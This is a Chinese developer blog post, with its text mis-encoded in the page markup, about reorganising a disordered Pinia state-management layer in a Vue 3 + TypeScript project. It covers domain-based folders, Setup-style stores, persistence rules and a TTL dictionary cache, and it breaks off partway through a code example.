<meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æˆ‘æ˜¯å¦‚ä½•æ²»ç†ä¸€ä¸ªæ··ä¹±çš„ Pinia çŠ¶æ€ç®¡ç†ç³»ç»Ÿçš„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2277843821926871/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§è±¡çš„é¼»å­é‚£ä¹ˆé•¿
  </span> <!----> <!----> <div class="vip-level" data-v-cd7d0a50="" data-v-292f6e48=""><span class="tooltip" data-v-cd7d0a50=""><div class="byte-tooltip byte-tooltip--dark" style="display:none;">
        VIP.4 èä¼šè´¯é€š
      </div><span class="byte-tooltip__wrapper"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="VIP.4 èä¼šè´¯é€š" title="VIP.4 èä¼šè´¯é€š" class="lazy" style="aspect-ratio:NaN;" data-v-5244ef91="" data-v-cd7d0a50=""/></span></span></div> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:20:15.000Z" title="Mon Dec 08 2025 04:20:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ€è¿‘æ¥æ‰‹äº†ä¸€ä¸ª Vue 3 + TypeScript çš„ä¸­å¤§å‹é¡¹ç›®ï¼ŒçŠ¶æ€ç®¡ç†è¿™å—â€¦æ€ä¹ˆè¯´å‘¢ï¼Œä¸€è¨€éš¾å°½ã€‚èŠ±äº†ä¸¤å‘¨æ—¶é—´åšäº†ä¸€æ¬¡ç³»ç»Ÿæ€§çš„æ²»ç†ï¼Œè¸©äº†ä¸å°‘å‘ï¼Œä¹Ÿæ€»ç»“å‡ºä¸€äº›ç»éªŒï¼Œåˆ†äº«ç»™åŒæ ·åœ¨"å±å±±"ä¸­æŒ£æ‰çš„æœ‹å‹ä»¬ã€‚</p>
</blockquote>
<h2 data-id="heading-0">èƒŒæ™¯ï¼šæ¥æ‰‹æ—¶çš„çŠ¶å†µ</h2>
<p>é¡¹ç›®ç”¨çš„æ˜¯ Piniaï¼Œä½†æ‰“å¼€ <code>src/store</code> ç›®å½•çš„é‚£ä¸€åˆ»ï¼Œæˆ‘æ²‰é»˜äº†ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">src/store/
â”œâ”€â”€ index.ts
â”œâ”€â”€ user.ts               <span class="hljs-comment"># Options API é£æ ¼</span>
â”œâ”€â”€ system.ts             <span class="hljs-comment"># Options API é£æ ¼</span>
â”œâ”€â”€ loading.ts            <span class="hljs-comment"># åŠæˆå“</span>
â”œâ”€â”€ keepAlive.ts          <span class="hljs-comment"># æ²¡æœ‰ç±»å‹</span>
â”œâ”€â”€ point-to-point.ts     <span class="hljs-comment"># Setup é£æ ¼ + å•¥éƒ½å¾€é‡Œå¡</span>
â”œâ”€â”€ selection.ts          <span class="hljs-comment"># ä¸çŸ¥é“å¹²å˜›çš„</span>
â”œâ”€â”€ xxx-name.ts           <span class="hljs-comment"># å¥½å‡ ä¸ªç±»ä¼¼çš„æ–‡ä»¶</span>
â””â”€â”€ ...è¿˜æœ‰ä¸€å †
</code></pre>
<p>åå‡ ä¸ª Store æ–‡ä»¶æ‰å¹³åœ°å †åœ¨ä¸€èµ·ï¼Œæœ‰çš„ç”¨ Options APIï¼Œæœ‰çš„ç”¨ Setup é£æ ¼ï¼Œæœ‰çš„ç”¨ TypeScriptï¼Œæœ‰çš„æ»¡å± <code>any</code>ã€‚æ›´ç¦»è°±çš„æ˜¯ï¼Œ<code>composables</code> ç›®å½•é‡Œä¹Ÿæœ‰ä¸€å¥—"çŠ¶æ€ç®¡ç†"ï¼Œä¸¤è¾¹åŠŸèƒ½é‡å ï¼Œè°ä¹Ÿä¸çŸ¥é“è¯¥ç”¨å“ªä¸ªã€‚</p>
<h2 data-id="heading-1">é—®é¢˜è¯Šæ–­ï¼šåˆ°åº•å“ªå‡ºäº†é—®é¢˜</h2>
<p>åœ¨åŠ¨æ‰‹ä¹‹å‰ï¼Œæˆ‘èŠ±äº†åŠå¤©æ—¶é—´æ¢³ç†ï¼ŒæŠŠé—®é¢˜åˆ†æˆäº†ä¸‰ä¸ªç­‰çº§ã€‚</p>
<h3 data-id="heading-2">P0 - ä¸æ²»ä¸è¡Œ</h3>
<p><strong>1. ä»£ç é£æ ¼ç²¾ç¥åˆ†è£‚</strong></p>
<p>ä¸€åŠ Options APIï¼Œä¸€åŠ Setup é£æ ¼ã€‚Options API æ˜¯ Vue 2 æ—¶ä»£çš„å†™æ³•ï¼Œåœ¨ Vue 3 + TypeScript é¡¹ç›®é‡Œç”¨è¿™ä¸ªï¼Œç±»å‹æ¨æ–­å¾ˆéš¾å—ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ—§ä»£ç ï¼šOptions API</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'user'</span>, {
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">userInfo</span>: <span class="hljs-literal">null</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>,  <span class="hljs-comment">// åˆ°å¤„éƒ½æ˜¯ any</span>
    <span class="hljs-attr">permissions</span>: [] <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>[],
  }),
  <span class="hljs-attr">getters</span>: {
    <span class="hljs-attr">getLocale</span>: <span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">locale</span>,  <span class="hljs-comment">// è¿™ç§ getter æ¯«æ— æ„ä¹‰</span>
  },
  <span class="hljs-attr">actions</span>: {
    <span class="hljs-title function_">setUserInfoAction</span>(<span class="hljs-params">info</span>) {  <span class="hljs-comment">// Action åç¼€æ˜¯ä»€ä¹ˆé¬¼</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">userInfo</span> = info
    },
  },
})
</code></pre>
<p><strong>2. ç±»å‹å½¢åŒè™šè®¾</strong></p>
<p><code>as any</code>ã€<code>as any[]</code> æ»¡å¤©é£ï¼ŒTypeScript æˆäº†æ‘†è®¾ã€‚æœ‰äº›å¤æ‚å¯¹è±¡å®Œå…¨æ²¡æœ‰ç±»å‹å®šä¹‰ï¼Œå…¨é  IDE çŒœã€‚</p>
<p><strong>3. èŒè´£è¾¹ç•Œæ¨¡ç³Š</strong></p>
<p>æœ‰ä¸ªå« <code>point-to-point.ts</code> çš„æ–‡ä»¶ï¼Œé‡Œé¢å¡äº†ï¼šè¡¨å•çŠ¶æ€ã€å­—å…¸æ•°æ®ã€ä¸‹æ‹‰é€‰é¡¹ã€é€‰ä¸­é¡¹ç®¡ç†ã€ç”šè‡³è¿˜æœ‰ä¸€äº›å·¥å…·å‡½æ•°ã€‚500 å¤šè¡Œï¼Œè°éƒ½ä¸æ•¢åŠ¨ã€‚</p>
<h3 data-id="heading-3">P1 - è¿Ÿæ—©è¦æ”¹</h3>
<ul>
<li><strong>å‘½åé£æ ¼ä¸ç»Ÿä¸€</strong>ï¼š<code>point-to-point</code>ã€<code>appSystem</code>ã€<code>admin_user</code>ï¼Œä¸‰ç§å‘½åæ³•é½æ´»</li>
<li><strong>æŒä¹…åŒ–ç­–ç•¥æ··ä¹±</strong>ï¼šæœ‰çš„ç”¨ <code>localStorage</code>ï¼Œæœ‰çš„ç”¨ <code>sessionStorage</code>ï¼Œæœ‰çš„æ ¹æœ¬æ²¡åšæŒä¹…åŒ–ä½†æ•°æ®åˆ·æ–°å°±ä¸¢</li>
<li><strong>ç¼“å­˜é€»è¾‘é‡å¤</strong>ï¼šå¥½å‡ ä¸ª Store éƒ½è‡ªå·±å®ç°äº†ä¸€å¥—"å¸¦è¿‡æœŸæ—¶é—´çš„ç¼“å­˜"ï¼Œä»£ç å‡ ä¹ä¸€æ ·</li>
</ul>
<h3 data-id="heading-4">P2 - ä»£ç æ´ç™–</h3>
<ul>
<li>Getter åªæ˜¯ç®€å•è¿”å› stateï¼Œå®Œå…¨å¤šä½™</li>
<li>Action å‘½åå¸¦ <code>Action</code> åç¼€ï¼Œä¸ç¬¦åˆç¤¾åŒºä¹ æƒ¯</li>
<li>æ³¨é‡Šç¼ºå¤±ï¼Œä¸‰ä¸ªæœˆåè‡ªå·±éƒ½çœ‹ä¸æ‡‚</li>
</ul>
<h2 data-id="heading-5">è§£å†³æ–¹æ¡ˆï¼šæ€ä¹ˆæ²»</h2>
<h3 data-id="heading-6">ä¸€ã€æŒ‰ä¸šåŠ¡åŸŸç»„ç»‡ç›®å½•</h3>
<p>æ‰å¹³ç»“æ„æœ€å¤§çš„é—®é¢˜æ˜¯ï¼šé¡¹ç›®ä¸€å¤§ï¼Œæ‰¾æ–‡ä»¶å…¨é æœç´¢ã€‚</p>
<p>é‡æ„åçš„ç›®å½•ç»“æ„æŒ‰ä¸šåŠ¡åŸŸåˆ’åˆ†ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">src/store/
â”œâ”€â”€ index.ts              <span class="hljs-comment"># ç»Ÿä¸€å¯¼å‡º</span>
â”œâ”€â”€ core/                 <span class="hljs-comment"># æ ¸å¿ƒåŸŸï¼šç”¨æˆ·ã€ç³»ç»Ÿã€åŠ è½½çŠ¶æ€</span>
â”‚   â”œâ”€â”€ index.ts
â”‚   â”œâ”€â”€ user.ts
â”‚   â”œâ”€â”€ system.ts
â”‚   â””â”€â”€ loading.ts
â”œâ”€â”€ basicData/            <span class="hljs-comment"># åŸºç¡€æ•°æ®åŸŸï¼šç¼“å­˜ã€å­—å…¸</span>
â”‚   â”œâ”€â”€ index.ts
â”‚   â”œâ”€â”€ cache.ts
â”‚   â””â”€â”€ dict.ts
â”œâ”€â”€ search/               <span class="hljs-comment"># æœç´¢åŸŸï¼šæŸ¥è¯¢è¡¨å•ã€æ”¶è—</span>
â”‚   â”œâ”€â”€ index.ts
â”‚   â”œâ”€â”€ queryForm.ts
â”‚   â””â”€â”€ favorite.ts
â”œâ”€â”€ order/                <span class="hljs-comment"># è®¢å•åŸŸï¼šè¡¨å•ã€è‰ç¨¿</span>
â”‚   â”œâ”€â”€ index.ts
â”‚   â”œâ”€â”€ orderForm.ts
â”‚   â””â”€â”€ orderDraft.ts
â””â”€â”€ types/                <span class="hljs-comment"># ç±»å‹å®šä¹‰</span>
    â”œâ”€â”€ index.ts
    â””â”€â”€ user.types.ts
</code></pre>
<p>æ¯ä¸ªåŸŸä¸€ä¸ªç›®å½•ï¼Œæ¯ä¸ªç›®å½•ä¸€ä¸ª <code>index.ts</code> è´Ÿè´£å¯¼å‡ºã€‚ä½¿ç”¨æ—¶å¯ä»¥æŒ‰åŸŸå¯¼å…¥ï¼Œä¹Ÿå¯ä»¥ä»æ ¹ç›®å½•å¯¼å…¥ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æŒ‰åŸŸå¯¼å…¥ï¼ˆæ¨èï¼‰</span>
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'~/store/core'</span>

<span class="hljs-comment">// æ ¹ç›®å½•å¯¼å…¥</span>
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'~/store'</span>
</code></pre>
<h3 data-id="heading-7">äºŒã€ç»Ÿä¸€ Setup é£æ ¼ + ä»£ç åˆ†å—</h3>
<p>æ‰€æœ‰ Store ç»Ÿä¸€ç”¨ Setup é£æ ¼é‡å†™ï¼Œä»£ç æŒ‰ State â†’ Getters â†’ Actions â†’ Return åˆ†å—ç»„ç»‡ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * ç”¨æˆ·çŠ¶æ€ç®¡ç†
 * <span class="hljs-doctag">@description</span> ç®¡ç†ç”¨æˆ·ä¿¡æ¯ã€æƒé™ã€Token
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = <span class="hljs-title function_">defineStore</span>(
  <span class="hljs-string">'user'</span>,
  <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// ==================== State ====================</span>

    <span class="hljs-comment">/** ç”¨æˆ·ä¿¡æ¯ */</span>
    <span class="hljs-keyword">const</span> userInfo = ref&lt;<span class="hljs-title class_">UserInfo</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>)

    <span class="hljs-comment">/** æƒé™åˆ—è¡¨ */</span>
    <span class="hljs-keyword">const</span> permissions = ref&lt;<span class="hljs-built_in">string</span>[]&gt;([])

    <span class="hljs-comment">/** Token */</span>
    <span class="hljs-keyword">const</span> token = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)

    <span class="hljs-comment">// ==================== Getters ====================</span>

    <span class="hljs-comment">/** æ˜¯å¦å·²ç™»å½• */</span>
    <span class="hljs-keyword">const</span> isLoggedIn = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> !!token.<span class="hljs-property">value</span> &amp;&amp; !!userInfo.<span class="hljs-property">value</span>)

    <span class="hljs-comment">/** æ£€æŸ¥æ˜¯å¦æœ‰æŒ‡å®šæƒé™ */</span>
    <span class="hljs-keyword">const</span> hasPermission = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-function">(<span class="hljs-params">code: <span class="hljs-built_in">string</span></span>) =&gt;</span>
      permissions.<span class="hljs-property">value</span>.<span class="hljs-title function_">includes</span>(code)
    )

    <span class="hljs-comment">// ==================== Actions ====================</span>

    <span class="hljs-comment">/**
     * åŠ è½½ç”¨æˆ·ä¿¡æ¯
     */</span>
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadUserInfo</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
      <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getUserInfo</span>()
      userInfo.<span class="hljs-property">value</span> = res.<span class="hljs-property">data</span>
    }

    <span class="hljs-comment">/**
     * ç™»å‡º
     */</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">logout</span>(<span class="hljs-params"/>): <span class="hljs-built_in">void</span> {
      userInfo.<span class="hljs-property">value</span> = <span class="hljs-literal">null</span>
      permissions.<span class="hljs-property">value</span> = []
      token.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>
    }

    <span class="hljs-comment">// ==================== Return ====================</span>

    <span class="hljs-keyword">return</span> {
      <span class="hljs-comment">// State</span>
      userInfo,
      permissions,
      token,
      <span class="hljs-comment">// Getters</span>
      isLoggedIn,
      hasPermission,
      <span class="hljs-comment">// Actions</span>
      loadUserInfo,
      logout,
    }
  },
  {
    <span class="hljs-attr">persist</span>: {
      <span class="hljs-attr">key</span>: <span class="hljs-string">'app-user'</span>,
      <span class="hljs-attr">storage</span>: <span class="hljs-variable language_">localStorage</span>,
    },
  },
)
</code></pre>
<p>è¿™ä¸ªç»“æ„æœ‰å‡ ä¸ªå¥½å¤„ï¼š</p>
<ol>
<li><strong>æ³¨é‡Šåˆ†å—</strong>ï¼Œä¸€ç›®äº†ç„¶</li>
<li><strong>è¿”å›å€¼æ˜¾å¼åˆ—å‡º</strong>ï¼ŒçŸ¥é“ Store æš´éœ²äº†ä»€ä¹ˆ</li>
<li><strong>ç±»å‹æ¨æ–­å®Œç¾</strong>ï¼Œä¸éœ€è¦é¢å¤–å£°æ˜</li>
</ol>
<h3 data-id="heading-8">ä¸‰ã€ç»Ÿä¸€æŒä¹…åŒ–ç­–ç•¥</h3>
<p>ä¹‹å‰çš„æŒä¹…åŒ–å¾ˆéšæ„ï¼Œç°åœ¨ç»Ÿä¸€è§„åˆ™ï¼š</p>



































<table><thead><tr><th>æ•°æ®ç±»å‹</th><th>å­˜å‚¨æ–¹å¼</th><th>ç†ç”±</th></tr></thead><tbody><tr><td>ç”¨æˆ·ä¿¡æ¯ã€Token</td><td>localStorage</td><td>éœ€è¦è·¨æ ‡ç­¾é¡µã€æŒä¹…ä¿å­˜</td></tr><tr><td>ç³»ç»Ÿé…ç½®ã€ä¸»é¢˜</td><td>localStorage</td><td>ç”¨æˆ·åå¥½éœ€è¦æŒä¹…</td></tr><tr><td>è¡¨å•è‰ç¨¿</td><td>localStorage</td><td>é˜²æ­¢æ„å¤–å…³é—­ä¸¢å¤±</td></tr><tr><td>æŸ¥è¯¢æ¡ä»¶</td><td>sessionStorage</td><td>åªåœ¨å½“å‰ä¼šè¯æœ‰æ•ˆ</td></tr><tr><td>åŠ è½½çŠ¶æ€</td><td>ä¸æŒä¹…åŒ–</td><td>å®æ—¶çŠ¶æ€ï¼Œåˆ·æ–°å½’é›¶</td></tr></tbody></table>
<h3 data-id="heading-9">å››ã€å¸¦ TTL çš„ç¼“å­˜ Store</h3>
<p>åŸºç¡€æ•°æ®ï¼ˆæ¯”å¦‚å­—å…¸ã€çœå¸‚åŒºï¼‰éœ€è¦ç¼“å­˜ï¼Œä½†ä¸èƒ½æ— é™æœŸã€‚å†™äº†ä¸€ä¸ªé€šç”¨çš„å¸¦è¿‡æœŸæ—¶é—´çš„ç¼“å­˜ Storeï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useDictStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'dict'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">/** ç¼“å­˜æ•°æ® */</span>
  <span class="hljs-keyword">const</span> cache = ref&lt;<span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">CacheItem</span>&gt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>())

  <span class="hljs-comment">/** é»˜è®¤ TTLï¼š30 åˆ†é’Ÿ */</span>
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_TTL</span> = <span class="hljs-number">30</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>

  <span class="hljs-comment">/**
   * è·å–å­—å…¸æ•°æ®ï¼ˆè‡ªåŠ¨å¤„ç†ç¼“å­˜ï¼‰
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getDict</span>(<span class="hljs-params"><span class="hljs-keyword">type</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">DictItem</span>[]&gt; {
    <span class="hljs-keyword">const</span> cached = cache.<span class="hljs-property">value</span>.<span class="hljs-title function_">get</span>(<span class="hljs-keyword">type</span>)

    <span class="hljs-comment">// ç¼“å­˜æœ‰æ•ˆï¼Œç›´æ¥è¿”å›</span>
    <span class="hljs-keyword">if</span> (cached &amp;&amp; <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - cached.<span class="hljs-property">timestamp</span> &lt; cached.<span class="hljs-property">ttl</span>) {
      <span class="hljs-keyword">return</span> cached.<span class="hljs-property">data</span>
    }

    <span class="hljs-comment">// ç¼“å­˜è¿‡æœŸæˆ–ä¸å­˜åœ¨ï¼Œé‡æ–°è¯·æ±‚</span>
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchDictByType</span>(<span class="hljs-keyword">type</span>)
    cache.<span class="hljs-property">value</span>.<span class="hljs-title function_">set</span>(<span class="hljs-keyword">type</span>, {
      <span class="hljs-attr">data</span>: res.<span class="hljs-property">data</span>,
      <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
      <span class="hljs-attr">ttl</span>: <span class="hljs-variable constant_">DEFAULT_TTL</span>,
    })

    <span class="hljs-keyword">return</span> res.<span class="hljs-property">data</span>
  }

  <span class="hljs-comment">/**
   * æ¸…é™¤æŒ‡å®šç¼“å­˜
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">clearCache</span>(<span class="hljs-params"><span class="hljs-keyword">type</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">void</span> {
    cache.<span class="hljs-property">value</span>.<span class="hljs-title function_">delete</span>(<span class="hljs-keyword">type</span>)
  }

  <span class="hljs-keyword">return</span> { cache, getDict, clearCache }
})
</code></pre>
<p>è°ƒç”¨æ–¹å®Œå…¨ä¸ç”¨å…³å¿ƒç¼“å­˜é€»è¾‘ï¼Œç›´æ¥ <code>await dictStore.getDict('CONTRACT_TYPE')</code> å°±è¡Œã€‚</p>
<h3 data-id="heading-10">äº”ã€Store å’Œ Composable çš„åˆ†å·¥</h3>
<p>è¿™æ˜¯å¾ˆå¤šäººçº ç»“çš„é—®é¢˜ï¼šä»€ä¹ˆæ—¶å€™ç”¨ Storeï¼Œä»€ä¹ˆæ—¶å€™ç”¨ Composableï¼Ÿ</p>
<p>æˆ‘çš„åŸåˆ™å¾ˆç®€å•ï¼š</p>








































<table><thead><tr><th>åœºæ™¯</th><th>ç”¨ Store</th><th>ç”¨ Composable</th></tr></thead><tbody><tr><td>æ•°æ®éœ€è¦è·¨ç»„ä»¶å…±äº«</td><td>âœ…</td><td>âŒ</td></tr><tr><td>æ•°æ®éœ€è¦æŒä¹…åŒ–</td><td>âœ…</td><td>âŒ</td></tr><tr><td>æ•°æ®æ˜¯å…¨å±€å•ä¾‹</td><td>âœ…</td><td>âŒ</td></tr><tr><td>åªåœ¨å•ä¸ªç»„ä»¶å†…ä½¿ç”¨</td><td>âŒ</td><td>âœ…</td></tr><tr><td>å°è£…å¯å¤ç”¨çš„é€»è¾‘</td><td>âŒ</td><td>âœ…</td></tr><tr><td>å°è£…å‰¯ä½œç”¨ï¼ˆå®šæ—¶å™¨ã€äº‹ä»¶ç›‘å¬ï¼‰</td><td>âŒ</td><td>âœ…</td></tr></tbody></table>
<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// Storeï¼šç®¡ç†å…¨å±€è®¢å•çŠ¶æ€</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useOrderStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'order'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> currentOrder = ref&lt;<span class="hljs-title class_">Order</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>)
  <span class="hljs-keyword">const</span> draftList = ref&lt;<span class="hljs-title class_">OrderDraft</span>[]&gt;([])
  <span class="hljs-keyword">return</span> { currentOrder, draftList }
})

<span class="hljs-comment">// Composableï¼šå°è£…è®¢å•è¡¨å•é€»è¾‘</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useOrderForm</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> store = <span class="hljs-title function_">useOrderStore</span>()
  <span class="hljs-keyword">const</span> { t } = <span class="hljs-title function_">useI18n</span>()

  <span class="hljs-comment">// è¡¨å•æ•°æ®ï¼ˆç»„ä»¶çº§ï¼Œä¸éœ€è¦å…±äº«ï¼‰</span>
  <span class="hljs-keyword">const</span> formData = ref&lt;<span class="hljs-title class_">OrderFormData</span>&gt;({})
  <span class="hljs-keyword">const</span> loading = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)

  <span class="hljs-comment">// è¡¨å•éªŒè¯è§„åˆ™</span>
  <span class="hljs-keyword">const</span> rules = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">productName</span>: [{ <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">message</span>: <span class="hljs-title function_">t</span>(<span class="hljs-string">'order.productRequired'</span>) }],
  }))

  <span class="hljs-comment">// æäº¤è®¢å•</span>
  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">submit</span>(<span class="hljs-params"/>) {
    loading.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">submitOrder</span>(formData.<span class="hljs-property">value</span>)
